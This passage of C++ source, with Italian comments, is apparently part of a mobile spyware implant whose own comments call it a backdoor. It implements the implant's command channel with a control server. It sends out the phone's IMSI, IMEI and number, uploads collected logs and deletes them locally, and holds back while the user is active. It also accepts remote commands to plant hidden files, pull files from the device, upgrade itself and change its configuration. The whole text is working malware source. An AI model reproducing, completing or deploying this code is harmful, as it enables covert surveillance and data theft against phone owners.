	// Primo step del protocollo (CHALLENGE)
	if (SendChallenge(localSocket) == FALSE) {
		SendCommand(localSocket, PROTO_BYE);
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> SendChallenge() FAILED [0] ", 3, TRUE);
		return FALSE;
	}

	// Secondo step, controlliamo il response
	if (CheckResponse(localSocket) == FALSE) {
		SendCommand(localSocket, PROTO_BYE);
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> CheckResponse() FAILED [1] ", 3, TRUE);
		return FALSE;
	}

	if (SendCommand(localSocket, PROTO_OK) == SOCKET_ERROR) {
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> SendCommand() FAILED [2] ", 3, TRUE);
		return FALSE;
	}

	// Terzo step, riceviamo il challenge dal server
	if (GetChallenge(localSocket) == FALSE) {
		SendCommand(localSocket, PROTO_BYE);
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> GetChallenge() FAILED [3] ", 3, TRUE);
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(localSocket) != PROTO_OK) {
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> RecvCommand() FAILED [4] ", 3, TRUE);
		return FALSE;
	}

	// QUI FINISCE LA PARTE DI GESTIONE DEL CHALLENGE RESPONSE 

	// Inviamo i dati di identificazione del device
	if (SendIds(localSocket) == FALSE) {
		SendCommand(localSocket, PROTO_BYE);
		DBG_TRACE(L"Debug - Transfer.cpp - Send() -> SendIds() FAILED [5] ", 3, TRUE);
		return FALSE;
	}

	bNewConf = FALSE;
	bUninstall = FALSE;

	// RICEVIAMO LA NUOVA CONFIGURAZIONE O EVENTUALI COMANDI 
	LOOP {
		if ((dwData = RecvCommand(localSocket)) == SOCKET_ERROR) {
			SendCommand(localSocket, PROTO_BYE);
			DBG_TRACE(L"Debug - Transfer.cpp - Send() -> RecvCommand() FAILED [0] ", 3, TRUE);
			return FALSE;
		}

		switch (dwData) {
			case PROTO_SYNC: 	// PARTIAMO CON LA SYNC 
				if (SyncOldProto(localSocket, bInterrupt) == FALSE) {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> Sync() FAILED [1]\n", 3, FALSE);
					SendCommand(localSocket, PROTO_NO);
				} else {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> Sync() OK\n", 3, FALSE);
				}

				ClearLogSnapshot();
				break;

			case PROTO_NEW_CONF:
				if (GetNewConf(localSocket) == FALSE) {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> GetNewConf() FAILED [2]\n", 3, FALSE);
					SendCommand(localSocket, PROTO_NO);
				} else {
					bNewConf = TRUE;
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> GetNewConf() OK\n", 3, FALSE);
				}

				break;

			case PROTO_UNINSTALL:
				bUninstall = TRUE;
				SendCommand(localSocket, PROTO_OK);
				DBG_TRACE(L"Debug - Transfer.cpp - Send() -> PROTO_UNINSTALL OK\n", 3, FALSE);
				return TRUE;

			case PROTO_DOWNLOAD:
				if (SendDownload(localSocket) == FALSE) {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> SendDownload() FAILED [3]\n", 3, FALSE);
					SendCommand(localSocket, PROTO_NO);
				}
				break;

			case PROTO_FILESYSTEM:
				if (SendFileSystem(localSocket) == FALSE) {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> SendFileSystem() FAILED [4]\n", 3, FALSE);
					SendCommand(localSocket, PROTO_NO);
				}
				break;

			case PROTO_UPLOAD:
				if (GetUpload(localSocket) == FALSE) {
					SendCommand(localSocket, PROTO_NO);
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> PROTO_UPLOAD FAILED [5]\n", 3, FALSE);
				} else {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> PROTO_UPLOAD() OK\n", 3, FALSE);
				}
				break;

			case PROTO_UPGRADE:
				if (GetUpgrade(localSocket) == FALSE) {
					SendCommand(localSocket, PROTO_NO);
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> GetUpgrade() FAILED [6]\n", 3, FALSE);
				} else {
					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> GetUpgrade() OK\n", 3, FALSE);
				}
				break;

			case PROTO_BYE:
				DBG_TRACE(L"Debug - Transfer.cpp - Send() -> PROTO_BYE OK\n", 3, FALSE);
				return TRUE;

			default:
				DBG_TRACE(L"Debug - Transfer.cpp - Send() -> UNKNOWN COMMAND RECEIVED\n", 1, FALSE);
				return FALSE;
		}
	}

	// SALUTIAMO IL SERVER 
	//SendCommand(localSocket, PROTO_BYE);
	DBG_TRACE(L"Debug - Transfer.cpp - Send() OK\n", 3, FALSE);
	***/
	return TRUE;
}

BOOL Transfer::SendIds(SOCKET s) {
	
	UINT uLen = 0;
	DWORD dwData = 0;
	BYTE *pData = NULL, *pEncrypted = NULL;
	Device *pDev = Device::self();
	auto_ptr<Encryption> pEnc(new (std::nothrow) Encryption(g_Challenge, KEY_LEN));

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	if (pDev == NULL || pEnc.get() == NULL)
		return FALSE;

	pDev->RefreshData();

	// 1. Invio la versione (cifrata) della backdoor
	if (SendCommand(s, PROTO_VERSION) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = sizeof(g_Version); // Lunghezza di g_Version
	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// Cifriamo g_Version (16 byte)
	pData = pEnc->EncryptData((BYTE *)&g_Version, &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 2. Inviamo il subyte (cifrato)
	if (SendCommand(s, PROTO_SUBTYPE) == SOCKET_ERROR) {
		return FALSE;
	}

	// E' un literal, calcoliamo la lunghezza con strlen()
	uLen = strlen((CHAR *)g_Subtype);
	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// Cifriamo il g_Subtype
	pData = pEnc->EncryptData((BYTE *)&g_Subtype, &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 3. Invio l'id univoco della backdoor
	if (SendCommand(s, PROTO_ID) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = 16;
	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// Cifriamo il g_BackdoorID (14 byte)
	uLen = 16;
	pData = pEnc->EncryptData(g_BackdoorID, &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 4. Invio l'instance id della backdoor
	if (SendCommand(s, PROTO_INSTANCE) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = 20;
	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// Cifriamo il g_InstanceId (20 byte)
	pData = pEnc->EncryptData(g_InstanceId, &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 5. Invio l'IMSI
	if (SendCommand(s, PROTO_USERID) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = pDev->GetImsi().size() * sizeof(WCHAR);

	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	pData = pEnc->EncryptData((BYTE *)pDev->GetImsi().c_str(), &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server (solo se abbiamo spedito dati)
	if (uLen && RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 6. Invio l'IMEI
	if (SendCommand(s, PROTO_DEVICEID) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = pDev->GetImei().size() * sizeof(WCHAR);

	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	pData = pEnc->EncryptData((BYTE *)pDev->GetImei().c_str(), &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server (solo se abbiamo spedito dati)
	if (uLen && RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	// 7. Inviamo il numero di telefono
	if (SendCommand(s, PROTO_SOURCEID) == SOCKET_ERROR) {
		return FALSE;
	}

	uLen = pDev->GetPhoneNumber().size() * sizeof(WCHAR);

	if (SendData(s, (BYTE *)&uLen, sizeof(UINT)) == SOCKET_ERROR) {
		return FALSE;
	}

	// Attendiamo l'OK dal server (solo se abbiamo spedito dati)
	if (RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}

	pData = pEnc->EncryptData((BYTE *)pDev->GetPhoneNumber().c_str(), &uLen);

	if (pData == NULL) {
		return FALSE;
	}

	if (SendData(s, pData, uLen) == SOCKET_ERROR) {
		delete[] pData;
		return FALSE;
	}

	delete[] pData;
	pData = NULL;

	// Attendiamo l'OK dal server (solo se abbiamo spedito dati)
	if (uLen && RecvCommand(s) != PROTO_OK) {
		return FALSE;
	}
	
	return TRUE;
}

BOOL Transfer::SendChallenge(SOCKET s) {
	
	UINT uRand, i;
	Rand r;

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	// Generiamo 16 byte casuali
	for (i = 0; i < 16; i += 4) {
		uRand = r.rand32();
		CopyMemory((BYTE *)&Challenge[i], &uRand, sizeof(uRand));
	}

	// Spediamo il CHALLENGE command
	if (SendCommand(s, PROTO_CHALLENGE) == SOCKET_ERROR)
		return FALSE;

	// E poi spediamo il challenge
	if (SendData(s, Challenge, 16) == SOCKET_ERROR)
		return FALSE;
		
	return TRUE;
}

BOOL Transfer::CheckResponse(SOCKET s) {
	
	BYTE Response[16], *pChallenge = NULL;
	UINT uCommand = 0, uLen = 0;
	auto_ptr<Encryption> pEnc(new (std::nothrow) Encryption(g_Challenge, KEY_LEN));

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	if (pEnc.get() == NULL)
		return FALSE;

	uLen = 16;
	pChallenge = pEnc->EncryptData(Challenge, &uLen);

	if (pChallenge == NULL)
		return FALSE;

	CopyMemory(Challenge, pChallenge, 16);
	delete[] pChallenge;

	// Riceviamo il comando di response
	if (RecvCommand(s) != PROTO_RESPONSE)
		return FALSE;

	// Riceviamo il response vero e proprio
	if (RecvData(s, Response, 16) == SOCKET_ERROR)
		return FALSE;

	// Prendiamo i byte, e controlliamo se quelli cifrati dal server
	// sono uguali ai nostri
	if (RtlEqualMemory(Response, Challenge, sizeof(Challenge)) == FALSE)
		return FALSE;
		
	return TRUE;
}

BOOL Transfer::GetChallenge(SOCKET s) {
	
	BYTE uChallenge[16], *pChallenge = NULL;
	UINT uCommand = 0, uLen = 0;
	auto_ptr<Encryption> pEnc(new (std::nothrow) Encryption(g_Challenge, KEY_LEN));

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	if (pEnc.get() == NULL)
		return FALSE;

	// Riceviamo il comando di challenge
	if (RecvCommand(s) != PROTO_CHALLENGE)
		return FALSE;

	// Riceviamo il challenge vero e proprio
	if (RecvData(s, uChallenge, 16) == SOCKET_ERROR)
		return FALSE;

	uLen = 16;
	pChallenge = pEnc->EncryptData(uChallenge, &uLen);

	if (pChallenge == NULL)
		return FALSE;

	CopyMemory(uChallenge, pChallenge, 16);
	delete[] pChallenge;

	// Spediamo il RESPONSE command
	if (SendCommand(s, PROTO_RESPONSE) == SOCKET_ERROR)
		return FALSE;

	// E poi spediamo il response
	if (SendData(s, uChallenge, 16) == SOCKET_ERROR)
		return FALSE;
		
	return TRUE;
}

BOOL Transfer::SyncOldProto(SOCKET s, BOOL bInterrupt) {
	
#define SAFE_EXIT(x)	if(pData) \
	delete[] pData; \
	if (hFile != INVALID_HANDLE_VALUE) \
	CloseHandle(hFile); \
	return x;

	BYTE *pData = NULL;
	list<LogInfo>::iterator iter;
	UINT uCommand = 0, dwSize, dwRead = 0, dwBuf[2];
	HANDLE hFile;

	if (s == NULL || s == INVALID_SOCKET) {
		DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
	// Lo snapshot viene liberato subito dopo questa chiamata.
	pSnap = uberlogObj->ListClosed();

	if (pSnap == NULL || pSnap->size() == 0) {
		DBG_TRACE(L"Debug - Transfer.cpp - Sync() there are no logs to send\n", 5, FALSE);

		if (SendCommand(s, PROTO_LOG_END) == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [1] ", 5, TRUE);
			return FALSE;
		}

		// Attendiamo l'OK dal server
		if (RecvCommand(s) != PROTO_OK) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [2] ", 5, TRUE);
			return FALSE;
		}

		return TRUE;
	}

	for (iter = pSnap->begin(); iter != pSnap->end(); iter++) {
		hFile = _CreateFileW((*iter).strLog.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE) {
			uberlogObj->Delete((*iter).strLog);
			continue;
		}

		dwSize = _GetFileSize(hFile, NULL);

		// Il file e' vuoto oppure non c'e' piu'
		if (dwSize == 0 || dwSize == 0xFFFFFFFF){
			CloseHandle(hFile);
			uberlogObj->Delete((*iter).strLog);	
			continue;
		}

		DBG_TRACE(L"Debug - Transfer.cpp - Sync() sending log file\n", 6, FALSE);

		// LOG,# di bytes
		dwBuf[0] = PROTO_LOG;
		dwBuf[1] = dwSize;

		if (SendData(s, (BYTE *)&dwBuf, sizeof(dwBuf)) == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [3] ", 5, TRUE);
			SAFE_EXIT(FALSE);
		}

		// Attendiamo l'OK dal server
		if (RecvCommand(s) != PROTO_OK) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [4] ", 5, TRUE);
			SAFE_EXIT(FALSE);
		}

		// Spediamo il TransferLog
		pData = new(std::nothrow) BYTE[dwSize];

		if (pData == NULL) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [5]\n", 5, FALSE);
			SAFE_EXIT(FALSE);
		}

		if (!ReadFile(hFile, pData, dwSize, (DWORD *)&dwRead, NULL)) {
			CloseHandle(hFile);
			delete[] pData;
			pData = NULL;
			continue;
		}

		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;

		if (SendData(s, pData, dwRead) == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [6] ", 5, TRUE);
			SAFE_EXIT(FALSE);
		}

		// Attendiamo l'OK dal server
		if (RecvCommand(s) != PROTO_OK) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [7] ", 5, TRUE);
			SAFE_EXIT(FALSE);
		}

		delete[] pData;
		pData = NULL;

		// Rimuoviamo il log dalla lista globale e dal filesystem
		uberlogObj->Delete((*iter).strLog);

		// Usciamo se siamo in crisis
		if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [We are in crisis] [8]\n", 5, FALSE);
			SAFE_EXIT(FALSE);
		}

		// Usciamo dal loop se l'utente riprende ad interagire col telefono
		if (bInterrupt && deviceObj->IsDeviceUnattended() == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [Power status changed] [9]\n", 5, FALSE);
			SAFE_EXIT(FALSE);
		}
	}

	if (SendCommand(s, PROTO_LOG_END) == SOCKET_ERROR) {
		DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [10] ", 5, TRUE);
		return FALSE;
	}

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK) {
		DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [11] ", 5, TRUE);
		return FALSE;
	}
	
	return TRUE;
}

INT Transfer::SendData(SOCKET s, BYTE *pData, UINT Len) {
	
	INT ret, offset;
	CHAR *tmp = NULL;

	if (s == NULL || s == INVALID_SOCKET) {
		DBG_TRACE(L"Debug - Transfer.cpp - SendData() FAILED [0] ", 4, TRUE);
		return SOCKET_ERROR;
	}

	if (pData == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - SendData() FAILED [1] ", 4, TRUE);
		return SOCKET_ERROR;
	}

	if (Len == 0)
		return 0;

	tmp = (CHAR *)pData;
	offset = 0;
	ret = 0;

	while((UINT)offset < Len) {
		ret = send(s, tmp, Len - offset, 0);

		if (ret == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - SendData() FAILED [2] ", 4, TRUE);
			return SOCKET_ERROR;
		}

		tmp += ret;
		offset += ret;
	}

	DBG_TRACE(L"Debug - Transfer.cpp - SendData() OK\n", 7, FALSE);
	return offset;

}

INT Transfer::RecvData(SOCKET s, BYTE *pData, UINT Len) {
	
	INT ret, offset;
	CHAR *tmp = NULL;

	if (s == NULL || s == INVALID_SOCKET || pData == NULL || Len == 0) {
		DBG_TRACE(L"Debug - Transfer.cpp - RecvData() FAILED [0] ", 4, TRUE);
		return SOCKET_ERROR;
	}

	if (Len == 0) {
		DBG_TRACE(L"Debug - Transfer.cpp - RecvData() FAILED [1] ", 4, TRUE);
		return 0;
	}

	tmp = (CHAR *)pData;
	offset = 0;
	ret = 0;

	while ((UINT)offset < Len) {
		ret = recv(s, (CHAR *)tmp, Len - offset, 0);

		if (ret == 0 || ret == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - RecvData() FAILED [2] ", 4, TRUE);
			return SOCKET_ERROR;
		}

		tmp += ret;
		offset += ret;
	}

	DBG_TRACE(L"Debug - Transfer.cpp - RecvData() OK\n", 7, FALSE);
	return offset;

}

INT Transfer::SendCommand(SOCKET s, UINT uCommand) {
	
	INT ret, offset;
	CHAR *tmp = NULL;

	if (s == NULL || s == INVALID_SOCKET || uCommand == INVALID_COMMAND) {
		DBG_TRACE(L"Debug - Transfer.cpp - SendCommand() FAILED [0] ", 4, TRUE);
		return SOCKET_ERROR;
	}

	tmp = (CHAR *)&uCommand;
	offset = 0;
	ret = 0;

	while ((UINT)offset < sizeof(uCommand)) {
		ret = send(s, tmp, sizeof(uCommand) - offset, 0);

		if (ret == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - SendCommand() FAILED [1] ", 4, TRUE);
			return ret;
		}

		tmp += ret;
		offset += ret; 
	}

	DBG_TRACE(L"Debug - Transfer.cpp - SendCommand() OK\n", 7, FALSE);
	return offset;

}

INT Transfer::RecvCommand(SOCKET s) {
	
	INT ret, offset;
	CHAR *tmp = NULL;
	UINT uCommand;

	if (s == NULL || s == INVALID_SOCKET) {
		DBG_TRACE(L"Debug - Transfer.cpp - RecvCommand() FAILED [0] ", 4, TRUE);
		return SOCKET_ERROR;
	}

	tmp = (CHAR *)&uCommand;
	offset = 0;
	ret = 0;

	while((UINT)offset < sizeof(uCommand)) {
		ret = recv(s, (CHAR *)tmp, sizeof(uCommand) - offset, 0);

		if(ret == 0 || ret == SOCKET_ERROR) {
			DBG_TRACE(L"Debug - Transfer.cpp - RecvCommand() FAILED [1] ", 4, TRUE);
			return SOCKET_ERROR;
		}

		tmp += ret;
		offset += ret;
	}

	DBG_TRACE(L"Debug - Transfer.cpp - RecvCommand() OK\n", 7, FALSE);
	
	return uCommand;
	
}

BOOL Transfer::GetNewConf(SOCKET s) {
	
	UINT uLen;
	BYTE *pNewConf = NULL;

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	// Leggiamo la lunghezza del file
	if (RecvData(s, (BYTE *)&uLen, sizeof(uLen)) == SOCKET_ERROR)
		return FALSE;

	if (uLen == 0)
		return FALSE;

	// Spediamo l'OK al server
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;

	pNewConf = new(std::nothrow) BYTE[uLen];

	if (pNewConf == NULL)
		return FALSE;

	if (RecvData(s, pNewConf, uLen) == SOCKET_ERROR) {
		delete[] pNewConf;
		return FALSE;
	}

	// Scriviamo la nuova conf
	Conf localConfObj;
	wstring strBackName;
	HANDLE hBackup = INVALID_HANDLE_VALUE;	
	DWORD dwWritten = 0;

	strBackName = localConfObj.GetBackupName(TRUE);

	if (strBackName.empty()) {
		delete[] pNewConf;	
		return FALSE;		
	}

	hBackup = _CreateFileW(strBackName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hBackup == INVALID_HANDLE_VALUE) {
		delete[] pNewConf;
		return FALSE;
	}

	if (WriteFile(hBackup, pNewConf, uLen, &dwWritten, NULL) == FALSE) {
		CloseHandle(hBackup);
		DeleteFile(GetCurrentPathStr(strBackName).c_str());
		delete[] pNewConf;
		return FALSE;
	}

	FlushFileBuffers(hBackup);
	CloseHandle(hBackup);
	delete[] pNewConf;

	// Spediamo l'OK al server
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;
		
	return TRUE;
}

BOOL Transfer::GetUpload(SOCKET s) {
	
	UINT uNameLen, uFileLen;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR *pwFilename = NULL;
	BYTE *pFile = NULL;
	DWORD dwWritten = 0;

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	// Spediamo l'OK al server per confermare che siamo pronti
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;

	// Riceviamo la lunghezza del nome del file, in byte
	if (RecvData(s, (BYTE *)&uNameLen, sizeof(uNameLen)) == SOCKET_ERROR)
		return FALSE;

	if (uNameLen == 0)
		return FALSE;

	// Il filename e' NULL-terminato, ma per sicurezza allochiamo un WCHAR in piu'
	pwFilename = new(std::nothrow) WCHAR[(uNameLen / sizeof(WCHAR)) + 1];

	if (pwFilename == NULL)
		return FALSE;

	ZeroMemory(pwFilename, uNameLen + sizeof(WCHAR));

	// Confermiamo l'avvenuta ricezione della lunghezza del nome
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pwFilename;
		return FALSE;
	}

	// Riceviamo il nome del file
	if (RecvData(s, (BYTE *)pwFilename, uNameLen) == SOCKET_ERROR) {
		delete[] pwFilename;
		return FALSE;
	}

	// Creiamolo
	wstring strUploaded;
	strUploaded = GetCurrentPath(pwFilename);

	ZeroMemory(pwFilename, uNameLen + sizeof(WCHAR));
	delete[] pwFilename;

	if (strUploaded.empty())
		return FALSE;

	hFile = _CreateFileW(strUploaded.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	// Spediamo l'OK al server
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		CloseHandle(hFile);
		return FALSE;
	}

	// Riceviamo la lunghezza del file
	if (RecvData(s, (BYTE *)&uFileLen, sizeof(uFileLen)) == SOCKET_ERROR) {
		CloseHandle(hFile);
		return FALSE;
	}

	if (uFileLen == 0) {
		CloseHandle(hFile);
		return FALSE;
	}

	pFile = new(std::nothrow) BYTE[uFileLen];

	if (pFile == NULL) {
		CloseHandle(hFile);
		return FALSE;
	}

	// Confermiamo l'avvenuta ricezione della lunghezza del file
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pFile;
		CloseHandle(hFile);
		return FALSE;
	}

	// Riceviamo il file
	if (RecvData(s, (BYTE *)pFile, uFileLen) == SOCKET_ERROR) {
		delete[] pFile;
		CloseHandle(hFile);
		return FALSE;
	}

	// Scriviamolo
	if (WriteFile(hFile, pFile, uFileLen, &dwWritten, NULL) == FALSE) {
		ZeroMemory(pFile, uFileLen);
		delete[] pFile;
		CloseHandle(hFile);
		return FALSE;
	}

	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	// Facciamo il wipe del contenuto del file
	ZeroMemory(pFile, uFileLen);
	delete[] pFile;

	if (dwWritten != uFileLen)
		return FALSE;

	// Confermiamo l'avvenuta ricezione del file
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;
		
	return TRUE;
}

BOOL Transfer::SendDownload(SOCKET s) {
	
	UINT uSearchLen;
	WCHAR *pwSearch = NULL;
	WIN32_FIND_DATA wfd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	BOOL bObscure;

	if (s == NULL || s == INVALID_SOCKET)
		return FALSE;

	// Spediamo l'OK al server per confermare che siamo pronti
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;

	// Riceviamo la lunghezza della search string
	if (RecvData(s, (BYTE *)&uSearchLen, sizeof(uSearchLen)) == SOCKET_ERROR)
		return FALSE;

	if (uSearchLen == 0)
		return FALSE;

	// La search string e' NULL-terminata, ma per sicurezza allochiamo un WCHAR in piu'
	pwSearch = new(std::nothrow) WCHAR[(uSearchLen / sizeof(WCHAR)) + 1];

	if (pwSearch == NULL)
		return FALSE;

	ZeroMemory(pwSearch, uSearchLen + sizeof(WCHAR));

	// Spediamo l'OK al server per confermare che possiamo ricevere la stringa
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// Riceviamo la search string
	if (RecvData(s, (BYTE *)pwSearch, uSearchLen) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// XXX dovremmo espandere le env-variables in futuro...

	// Spediamo l'OK al server
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// Espandiamo $dir$ se presente
	size_t strSpecialVar;
	wstring strSearchString, strBackdoorPath;

	strBackdoorPath = GetCurrentPath(NULL);
	strSearchString = pwSearch;

	if (strBackdoorPath.empty() == FALSE) {
		strSpecialVar = strSearchString.find(L"$dir$\\");

		// Se troviamo $dir$ nella search string espandiamolo
		if (strSpecialVar != wstring::npos) {
			bObscure = TRUE;
			strSearchString.replace(strSpecialVar, 6, strBackdoorPath); // Qui $dir$ viene espanso
		} else {
			bObscure = FALSE;
		}
	}

	delete[] pwSearch;

	ZeroMemory(&wfd, sizeof(wfd));
	hFind = _FindFirstFile(strSearchString.c_str(), &wfd);

	if (hFind == INVALID_HANDLE_VALUE) {
		// Non ci sono file
		if (GetLastError() == ERROR_NO_MORE_FILES) {
			if (SendCommand(s, PROTO_ENDFILE) == SOCKET_ERROR)
				return FALSE;

			// Attendiamo l'OK dal server
			if (RecvCommand(s) != PROTO_OK)
				return FALSE;

			return TRUE;
		}

		return FALSE;
	}

	do {
		// Anteponiamo il path al nome del file
		size_t trailingSlash = strSearchString.rfind(L"\\");

		// Il nome del file non contiene un path assoluto
		if (trailingSlash == wstring::npos) {
			FindClose(hFind);
			return FALSE;
		}

		wstring strPath;

		if (trailingSlash)
			strPath = strSearchString.substr(0, trailingSlash);

		strPath += L"\\";
		strPath += wfd.cFileName;

		// Creiamo un log per ogni file trovato
		CreateDownloadFile(strPath, bObscure);
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind);

	// Comunichiamo la fine della fase di download
	if (SendCommand(s, PROTO_ENDFILE) == SOCKET_ERROR)
		return FALSE;

	// Attendiamo l'OK dal server
	if (RecvCommand(s) != PROTO_OK)
		return FALSE;

	return TRUE;
}

BOOL Transfer::CreateDownloadFile(const wstring &strPath, BOOL bObscure) {
	
	Log log;
	LogDownload LogFileData;
	PBYTE pBuf = NULL;
	wstring strObscuredPath = strPath;
	HANDLE hLocalFile = INVALID_HANDLE_VALUE;

	ZeroMemory(&LogFileData, sizeof(LogFileData));

	if (strPath.empty())
		return FALSE;

	if (bObscure) {
		size_t trailingSlash = strPath.rfind(L"\\");

		if (trailingSlash != wstring::npos) {
			strObscuredPath = L"$dir$";
			strObscuredPath += strPath.substr(trailingSlash, strPath.size());
		}
	}

	LogFileData.uVersion = LOG_FILE_VERSION;
	LogFileData.uFileNameLen = strObscuredPath.size() * sizeof(WCHAR);

